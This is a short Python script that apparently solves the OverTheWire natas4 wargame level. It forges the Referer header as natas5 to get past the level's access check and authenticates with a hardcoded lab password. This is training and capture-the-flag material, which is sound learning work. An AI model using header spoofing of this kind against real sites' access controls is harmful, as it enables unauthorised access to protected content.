import requests

headers = {
    'Referer': 'http://natas5.natas.labs.overthewire.org/',
}

response = requests.get(
    'https://natas4.natas.labs.overthewire.org/',
    headers=headers,
    auth=('natas4', 'tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm'),
)

print(response.text)
